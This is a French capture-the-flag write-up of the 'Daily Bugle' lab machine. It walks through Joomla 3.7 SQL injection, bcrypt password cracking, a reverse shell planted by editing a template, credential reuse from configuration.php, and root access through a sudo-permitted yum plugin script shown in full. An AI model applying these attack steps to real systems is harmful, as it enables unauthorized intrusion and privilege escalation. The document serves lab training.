# Daily Bugle

- Difficulté : Hard (pas trop quand même)
- Linux
- Joomla | CVE-2017-8917
- SQLi
- Yum

## Énumération

### Nmap

```bash
sudo nmap -sC -sV -O -oN enum/nmap -vv 10.10.252.22

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src=
|   256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-methods: 
|_  Supported Methods: OPTIONS
3306/tcp open  mysql   syn-ack ttl 63 MariaDB (unauthorized)
```

### robots.txt

```bash
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

## Port 80 | HTTP

### Joomla version 3.7

Pour déterminer la version de Joomla, je me suis rendu dans le README.txt qui se trouve à la racine du serveur. Nous pouvons trouver à la première ligne la version qu’utilise Joomla.

Nous pouvons en déduire en regardant sur internet que cette version est vulnérable à une SQLi.

Explication de la vulnérabilité : 

[SQL Injection Vulnerability in Joomla! 3.7](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html)

Sur Github, nous pouvons trouver ce script pour pouvoir exploiter cette vulnérabilité : 

[https://github.com/stefanlucas/Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla)

En un rien de temps, le script dump la database. Nous trouvons le nom d’utilisateur Jonah ainsi que son password hashé en Bcrypt.

![Untitled](https://user-images.githubusercontent.com/68467919/209440130-aaa08dab-6ac2-409b-b602-6cbbe7e91487.png)

### John the ripper

Nous crackons le mot de passe grâce à JohnTheRipper. Au bout de 5 minutes nous avons retrouvé le mot de passe.

```bash
john --format=bcrypt --wordlist=rockyou.txt password.hash

spiderman123     (?)
```

### Panel Joomla

Désormais, nous pouvons nous connecter au panel administrateur grâce aux identifiants que nous avons trouvé !

![Untitled 1](https://user-images.githubusercontent.com/68467919/209440136-d49f8458-1766-49a6-8b7d-508d434baa1a.png)

### Reverse-Shell

Pour pouvoir obtenir un reverse-shell sur Joomla il suffit de modifier la template et de remplacer le code existant par notre script php. Pour ça, nous devons nous rendre dans **Extensions → Templates → Templates**. Ensuite nous sélectionnons la template que nous voulons modifier, par exemple Beez3.

![Untitled 2](https://user-images.githubusercontent.com/68467919/209440141-ac291afa-71b6-43f7-b763-73634b6ac7d3.png)

Dans index.php, nous remplaçons donc le code par notre script et nous enregistrons les modifications.

Après avoir sauvegarder les modifications, nous lançons notre listener puis nous cliquons sur “preview”.

![Untitled 3](https://user-images.githubusercontent.com/68467919/209440146-1d1c2196-54ab-4eeb-8fd8-6503a806a2cb.png)

## JJameson | Flag 1

![Untitled 4](https://user-images.githubusercontent.com/68467919/209440151-26327f26-c7af-441a-9cb8-482cc5f8e39f.png)

Nous pouvons escalader nos privilèges en nous connectant à la session de jjameson. Il est possible de trouver son mot de passe dans /var/www/html/configuration.php et nous pouvons trouver un mot de passe qui nous permettrait de nous connecter à la base de donnée. Nous pouvons réutiliser le mot de passe pour nous connecter en tant que jjameson via SSH.

![Untitled 5](https://user-images.githubusercontent.com/68467919/209440153-a7c9550f-9fc2-422b-8b24-f29467c2d6e2.png)

![Untitled 6](https://user-images.githubusercontent.com/68467919/209440155-f2728103-d0a1-4aea-b9ce-804a5e8183bf.png)

Nous pouvons trouver le flag de jjameson dans son home directory.

## Root | Root Flag

Vu que nous avons le mot de passe de jjameson, nous pouvons voir si nous pouvons exécuter des commandes avec les mêmes droits qu’un autre utilisateur.

```bash
[jjameson@dailybugle ~]$ sudo -l
Entrées par défaut pour jjameson sur dailybugle :
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

L'utilisateur jjameson peut utiliser les commandes suivantes sur dailybugle :
    (ALL) NOPASSWD: /usr/bin/yum
```

Nous pouvons voir que nous avons le droit d’exécuter le binaire yum. En regardant sur GTFOBins, nous pouvons voir qu’il est possible d’exécuter les commandes ci-dessous pour pouvoir essayer de faire spawn un shell interactif en tant que root ! 

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

![Untitled 7](https://user-images.githubusercontent.com/68467919/209440165-9a517971-452d-4060-8cb5-738ae5b856d8.png)

ROOTED !!
